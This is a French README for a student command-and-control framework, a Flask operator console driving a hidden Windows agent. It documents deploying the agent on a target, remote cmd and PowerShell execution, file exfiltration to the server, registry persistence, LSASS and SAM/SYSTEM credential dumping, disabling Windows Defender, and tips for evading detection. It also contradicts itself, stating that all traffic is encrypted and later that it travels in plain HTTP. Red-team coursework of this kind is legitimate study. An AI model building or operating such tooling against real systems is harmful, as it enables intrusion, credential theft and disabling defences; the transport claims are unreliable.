# Projet C2 — Framework Command & Control

Projet pédagogique réalisé dans le cadre du cours **T-SEC-911** à Epitech Paris.
Il implémente un framework C2 complet permettant de piloter à distance des agents Windows depuis une interface web.

> **Avertissement légal** : Ce projet est développé uniquement à des fins éducatives.
> Toute utilisation sur des systèmes sans autorisation explicite est illégale et punissable par la loi.

---

## Table des matières

1. [Architecture](#architecture)
2. [Structure du projet](#structure-du-projet)
3. [Prérequis](#prérequis)
4. [Installation](#installation)
5. [Configuration](#configuration)
6. [Compilation de l'agent](#compilation-de-lagent)
7. [Démarrage](#démarrage)
8. [Interface web](#interface-web)
9. [Référence des commandes](#référence-des-commandes)
10. [API REST](#api-rest)
11. [Logs](#logs)
12. [Dépannage](#dépannage)
13. [Pistes d'amélioration](#pistes-damélioration)

---

## Architecture

Le framework repose sur trois composants qui communiquent via **HTTPS chiffré** :

```
  Opérateur
  Navigateur → https://SERVEUR:5000
       │
       │ HTTPS port 5000 (chiffré SSL/TLS)
       ▼
 ┌─────────────────────────────────┐
 │  controller.py                  │
 │  Interface web Flask            │
 │  · Liste les agents actifs      │
 │  · Traduit les commandes C2     │
 │  · Historique par agent         │
 └────────────┬────────────────────┘
              │ (import direct)
              ▼
 ┌─────────────────────────────────┐
 │  server.py                      │
 │  API REST Flask — port 1234     │
 │  · Enregistrement des agents    │
 │  · Distribution des commandes   │
 │  · Collecte des résultats       │
 │  · Transfert de fichiers        │
 └────────────┬────────────────────┘
              │ HTTPS polling toutes les 3s
              │ (chiffré SSL/TLS)
              ▼
 ┌─────────────────────────────────┐
 │  agent.exe                      │
 │  Agent Windows en C             │
 │  · S'enregistre au démarrage    │
 │  · Poll les commandes           │
 │  · Exécute via cmd.exe          │
 │  · Renvoie les résultats        │
 └─────────────────────────────────┘
```

**Flux d'une commande :**

1. L'agent démarre → `POST /register` (id + répertoire courant) **[HTTPS]**
2. Toutes les 3 secondes → `GET /get_command?id=<id>` (répond `204` si rien) **[HTTPS]**
3. Le serveur répond `200` avec la commande à exécuter (chiffrée en transit)
4. L'agent exécute et envoie le résultat → `POST /post_result` **[HTTPS]**
5. Le contrôleur affiche le résultat à l'opérateur

**Sécurité du transport:**
- ✅ **Chiffrage SSL/TLS** : Toute communication entre l'agent et le serveur est chiffrée
- ✅ **Certificats auto-signés** : L'agent accepte automatiquement les certificats auto-signés du serveur
- ✅ **Protection des données** : Les commandes, résultats et fichiers transférés sont protégés en transit

---

## Sécurité

### Chiffrage en transit (HTTPS/SSL-TLS)

Toutes les communications entre l'agent C et le serveur Python sont **chiffrées en SSL/TLS v1.2+**:

| Données | Statut |
|---------|--------|
| Commandes envoyées | 🔐 **Chiffrées** |
| Résultats d'exécution | 🔐 **Chiffrées** |
| Fichiers transférés | 🔐 **Chiffrés** |
| Identifiant agent | 🔐 **Chiffré** |

### Certificats

Le serveur Python utilise des certificats auto-signés :
- **Certificat** : `server.crt`
- **Clé privée** : `server.key`

L'agent Windows accepte automatiquement ces certificats auto-signés grâce aux flags HTTPS:
```c
INTERNET_FLAG_IGNORE_CERT_CN_INVALID       // Ignore CN incorrect
INTERNET_FLAG_IGNORE_CERT_DATE_INVALID      // Ignore date expirant
INTERNET_FLAG_IGNORE_UNKNOWN_CA             // Ignore autorité inconnue
```

**Implication**: L'agent ne valide pas le certificat. 
- ✅ **Bon pour LAN fermé** : Sécurisé dans un environnement interne
- ⚠️ **Risqué sur Internet** : Vulnérable aux attaques MITM

---

## Structure du projet

```
T-SEC-911-PAR_9/
├── server/
│   ├── server.py              # API REST pour les agents (port 1234)
│   ├── controller.py          # Interface web opérateur (port 5000)
│   ├── templates/
│   │   ├── index.html         # Dashboard — liste des agents connectés
│   │   └── execute.html       # Terminal — console de contrôle par agent
│   ├── uploads/               # Fichiers reçus depuis les agents
│   └── server.log             # Journal des événements (généré au lancement)
├── agent/
│   ├── agent.c                # Code source de l'agent Windows (C)
│   └── agent.exe              # Binaire compilé (Windows x64)
├── Commande/
│   └── RESUME_COMMANDES.md    # Référence rapide des commandes C2
├── explicationAcheron.txt     # Notes sur les indirect syscalls (Acheron/Go)
└── README.md
```

---

## Prérequis

### Serveur (Linux / macOS / Windows)

- Python 3.8 ou supérieur
- pip

```bash
pip install flask werkzeug
```

### Agent (compilation)

| Environnement | Outil nécessaire |
|---|---|
| Windows avec MinGW | [MinGW-w64](https://www.mingw-w64.org/) |
| Windows avec MSVC | Visual Studio + Windows SDK |
| Linux (cross-compilation) | paquet `mingw-w64` |

---

## Installation

```bash
git clone <url-du-dépôt>
cd T-SEC-911-PAR_9
pip install flask werkzeug
```

---

## Configuration

### IP du serveur (obligatoire)

Modifier la ligne 10 de [agent/agent.c](agent/agent.c) :

```c
#define SERVER_HOST "192.168.1.190"  // Remplacer par l'IP de ta machine serveur
```

| Cas d'usage | Valeur à mettre |
|---|---|
| Serveur et agent sur la même machine | `"127.0.0.1"` |
| Réseau local | `"192.168.X.X"` (IP locale du serveur) |
| Internet | IP publique du serveur |

### Identifiant de l'agent

Ligne 12 — utile si plusieurs agents sont déployés simultanément :

```c
#define AGENT_ID "agent-003"
```

### Intervalle de polling

Ligne 16 — durée en millisecondes entre chaque requête au serveur :

```c
#define DELAY_MS 3000
```

### Token d'authentification (serveur)

Dans [server/server.py](server/server.py) ligne 25 :

```python
SECRET_TOKEN = "change-me-in-production"
```

> Le token est présent dans le code mais la vérification n'est pas activée par défaut.
> En environnement exposé, activer la vérification sur chaque route de l'API.

---

## Compilation de l'agent

### Depuis Linux — cross-compilation (recommandé)

```bash
sudo apt install mingw-w64
x86_64-w64-mingw32-gcc agent/agent.c -o agent/agent.exe -lwininet -lws2_32
```

### Depuis Windows — MinGW

```bash
gcc agent/agent.c -o agent/agent.exe -lwininet -lws2_32
```

### Depuis Windows — Visual Studio

```bash
cl agent/agent.c /link wininet.lib ws2_32.lib
```

---

## Démarrage

### Prérequis : Certificats SSL/TLS

Pour le chiffrage HTTPS, le serveur utilise des certificats auto-signés. S'ils n'existent pas, les générer:

```bash
cd /path/to/project
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
```

Fichiers attendus à la racine du projet:
- `server.crt` (certificat)
- `server.key` (clé privée)

### 1. Lancer le serveur

```bash
cd server
python controller.py
```

Sortie attendue :

```
🚀 Démarrage du serveur API (port 1234 - HTTPS)...
🌐 Démarrage de l'interface web (port 5000 - HTTPS)...
👉 Ouvre https://192.168.1.88:5000 dans ton navigateur
```

Deux serveurs Flask démarrent en parallèle :

| Port | Protocole | Rôle |
|---|---|---|
| **1234** | HTTPS 🔐 | API REST — consommée par les agents |
| **5000** | HTTPS 🔐 | Interface web — utilisée par l'opérateur |

### 2. Lancer l'agent

Copier `agent.exe` sur la machine Windows cible et l'exécuter :

```
agent.exe
```

L'agent s'exécute en arrière-plan, sans fenêtre visible.
Il établit automatiquement une connexion HTTPS sécurisée avec le serveur.

### 3. Accéder à l'interface

**Important** : Accepter l'avertissement de certificat auto-signé (c'est normal)

- Serveur local : `https://localhost:5000`
- Serveur distant : `https://IP_SERVEUR:5000`

---

## Interface web

### Dashboard (`/`)

Affiche tous les agents enregistrés avec :
- Identifiant de l'agent
- Répertoire de travail courant
- Temps écoulé depuis la dernière activité

Rafraîchissement automatique toutes les **5 secondes**.
Les agents silencieux depuis plus de **5 minutes** sont supprimés automatiquement.

### Console agent (`/<agent_id>/cmd`)

Terminal de contrôle avec :
- Barre de commandes rapides cliquables
- Terminal noir affichant la sortie des commandes avec le prompt courant
- Panneau latéral d'historique (100 commandes max par agent, cliquables)

Timeout de réponse : **30 secondes maximum** par commande.

---

## Référence des commandes

### Commandes Windows natives

Ces commandes sont exécutées directement via `cmd.exe` :

```
whoami                          Utilisateur actuel
hostname                        Nom de la machine
dir                             Contenu du répertoire courant
ipconfig /all                   Configuration réseau complète
systeminfo                      Informations détaillées sur le système
tasklist                        Liste des processus actifs
netstat -an                     Connexions réseau actives
net user                        Liste des comptes utilisateurs locaux
net localgroup administrators   Membres du groupe Administrateurs
wmic os get caption             Version de Windows
powershell -c "<commande>"      Exécute une commande PowerShell
```

### Navigation

```
cd <chemin>           Change de répertoire (persistant entre les commandes)
cd /d <lecteur:\>     Change de lecteur et de répertoire
```

### Transfert de fichiers

```
upload <chemin_absolu>
    Envoie un fichier de l'agent vers le serveur.
    Destination : server/uploads/<agent_id>_<nom_du_fichier>
    Limite : 100 Mo par fichier
    Exemple : upload C:\Users\Public\rapport.pdf

download <nom_fichier> <chemin_destination>
    Télécharge un fichier depuis server/uploads/ vers l'agent.
    Exemple : download outil.exe C:\Temp\outil.exe
```

### Shell interactif persistant

Permet d'ouvrir une session interactive avec un programme (cmd, PowerShell, Python, etc.)
et d'y envoyer des commandes successivement sans relancer le processus.

```
shell <programme.exe>       Ouvre un shell interactif avec le programme spécifié
shell_cmd <commande>        Envoie une commande au shell ouvert et récupère la sortie
shell_close                 Ferme proprement le shell interactif
```

Exemples d'utilisation :

```
shell cmd.exe
shell_cmd dir C:\
shell_cmd net user
shell_close

shell powershell.exe
shell_cmd Get-Process | Where CPU -gt 10
shell_close
```

### Persistance

Ajoute ou retire un exécutable du démarrage automatique Windows
via la clé de registre `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.

```
persistence -n "NomApp" -p "C:\chemin\app.exe"     Ajoute au démarrage de session
unpersist -n "NomApp"                               Retire du démarrage
check-persist                                       Liste toutes les entrées de démarrage
```

### Extraction de credentials

> Toutes ces commandes nécessitent des droits **Administrateur**.

```
lsass                       Dump LSASS → C:\lsass.dmp  (via rundll32 + comsvcs.dll)
lsass C:\Temp\dump.dmp      Dump LSASS vers un chemin personnalisé
sam                         Sauvegarde HKLM\SAM     → C:\sam.save
system                      Sauvegarde HKLM\SYSTEM  → C:\system.save
security                    Sauvegarde HKLM\SECURITY → C:\security.save
```

### Contrôle de l'antivirus

> Nécessite des droits **Administrateur**.

```
av-off        Désactive Windows Defender (protection temps réel, IOA, comportement)
av-on         Réactive Windows Defender
av-status     Affiche l'état actuel de Windows Defender
```

### Contrôle général

```
check-admin   Vérifie si l'agent s'exécute avec des droits Administrateur
help          Affiche la liste des commandes dans l'interface web
quit          Arrête proprement l'agent
```

---

## API REST

L'API tourne sur le port **1234** et est consommée exclusivement par les agents.

| Méthode | Route | Description |
|---|---|---|
| `POST` | `/register` | Enregistrement d'un agent. Body : `id=<id>&cwd=<chemin>` |
| `GET` | `/get_command?id=<id>` | Récupère la prochaine commande. Retourne `204` si aucune en attente. |
| `POST` | `/post_result` | Envoie le résultat d'une commande. Body : `id=<id>&output=<sortie>&cwd=<chemin>` |
| `POST` | `/upload?id=<id>` | Upload multipart d'un fichier depuis l'agent. |
| `GET` | `/download/<filename>` | Téléchargement d'un fichier depuis `server/uploads/`. |

Toutes les valeurs textuelles sont encodées en URL (`%XX`) par l'agent avant envoi.

> **🔐 Sécurité** : Toutes les routes de l'API utilisent **HTTPS/SSL-TLS**. Les données sont chiffrées en transit entre l'agent et le serveur.

---

## Logs

Tous les événements sont enregistrés dans `server/server.log` :

```
2026-01-31 13:00:00 - INFO - Server starting on 0.0.0.0:1234
2026-01-31 13:00:05 - INFO - Agent registered: agent-003 from 192.168.1.42
2026-01-31 13:00:10 - INFO - Command sent to agent-003: dir
2026-01-31 13:00:13 - INFO - Result from agent-003: 842 bytes
2026-01-31 13:01:15 - INFO - File uploaded: agent-003_document.txt
2026-01-31 13:05:05 - INFO - Cleaning dead agent: agent-001
```

Surveiller les logs en temps réel :

```bash
tail -f server/server.log
```

---

## Dépannage

### L'agent ne se connecte pas

1. Vérifier `SERVER_HOST` dans `agent/agent.c` — l'IP doit être celle du serveur
2. Vérifier que le port 1234 est accessible depuis la machine de l'agent :
   ```bash
   # Depuis Windows (accepter le certificat auto-signé)
   curl -k https://IP_SERVEUR:1234/register

   # Ouvrir le port sur le serveur Linux
   sudo ufw allow 1234
   ```
3. Vérifier que `controller.py` est bien en cours d'exécution

### "Port already in use"

```bash
# Linux / macOS
lsof -ti:1234 | xargs kill -9
lsof -ti:5000 | xargs kill -9

# Windows
netstat -ano | findstr :5000
taskkill /PID <PID> /F
```

### "Module 'flask' not found"

```bash
pip install flask werkzeug
```

### "windows.h: No such file" à la compilation

Tu es sur Linux → utiliser la cross-compilation MinGW (voir section [Compilation](#compilation-de-lagent)).

### Les commandes bloquent ou timeout

- Les commandes one-shot qui ne se terminent pas seules (`ftp`, `ssh`, `python` en REPL…) ne sont pas compatibles avec le mode classique.
- Pour ce type de programme, utiliser `shell <prog.exe>` + `shell_cmd`.
- Timeout maximum : **30 secondes** par commande.

### L'agent se connecte mais les commandes ne passent pas

Vérifier que :
- `AGENT_ID` dans `agent.c` correspond exactement à l'ID affiché dans l'interface
- Le serveur tourne bien sur le port 1234 (`tail -f server/server.log`)

---

## Pistes d'amélioration

### Sécurité des communications

- **HTTPS / TLS** : les communications transitent actuellement en clair. Activer SSL sur les deux ports (via `ssl_context` dans Flask ou un reverse-proxy Nginx/Caddy) est indispensable dès que le serveur est exposé sur un réseau non maîtrisé.
- **Authentification API** : le token `SECRET_TOKEN` existe dans `server.py` mais sa vérification n'est pas appliquée sur les routes. Activer cette vérification empêcherait tout agent non autorisé d'interagir avec le serveur.
- **Chiffrement applicatif** : chiffrer le contenu des commandes et résultats (AES-GCM ou ChaCha20) offrirait une protection indépendante du transport TLS.

### Robustesse et fonctionnalités

- **File de commandes par agent** : actuellement, une seule commande peut être en attente par agent (`CMD_INPUT` est un dictionnaire). Utiliser une `deque` permettrait d'envoyer plusieurs commandes en rafale.
- **Persistance des données** : agents, historique et commandes sont en mémoire et perdus au redémarrage. Une base SQLite ou Redis assurerait la continuité entre sessions.
- **Reconnexion automatique** : si le serveur redémarre, l'agent continue de poller mais n'est plus enregistré. Détecter un `404` côté agent pour déclencher un ré-enregistrement rendrait le système plus résilient.
- **Métadonnées enrichies** : à l'enregistrement, l'agent ne transmet que son ID et son répertoire. Collecter automatiquement le nom d'hôte, l'utilisateur, la version Windows et le niveau de privilège enrichirait le dashboard.
- **Gestion des grandes sorties** : la sortie est limitée à 16 Ko (`OUTPUT_SIZE`). Une pagination ou une compression gzip permettrait de gérer des résultats volumineux.

### Interface et ergonomie

- **Authentification de l'interface web** : le port 5000 est accessible sans mot de passe. Ajouter Flask-Login ou une authentification HTTP basique protégerait la console opérateur.
- **Export des sessions** : permettre l'export de l'historique d'un agent en JSON ou CSV faciliterait la rédaction de rapports de pentest.
- **Support multi-opérateurs** : pas de gestion des conflits si deux utilisateurs contrôlent le même agent en même temps. Un système de verrou ou de canal dédié par session serait nécessaire.

### Discrétion (dans un contexte Red Team légal)

- **Beacon aléatoire** : le délai fixe de 3 secondes génère un pattern réseau facilement détectable par un SIEM. Randomiser l'intervalle dans une plage (ex. 2–8 s) atténue cette signature.
- **User-Agent légitime** : l'agent s'identifie comme `"Agent"` dans les requêtes HTTP. Utiliser un User-Agent de navigateur courant serait moins détectable.
- **Transport alternatif** : HTTP plain est trivial à inspecter et filtrer. Des C2 avancés (Cobalt Strike, Havoc) utilisent des transports moins suspects : HTTPS, DNS-over-HTTPS, protocoles applicatifs courants.

---

## Disclaimer

Ce projet est développé dans un cadre **strictement académique** (cours T-SEC-911, Epitech Paris).
Il ne doit être utilisé que sur des systèmes et réseaux dont vous avez **l'autorisation explicite** du propriétaire.
L'auteur décline toute responsabilité en cas d'utilisation illégale ou malveillante.
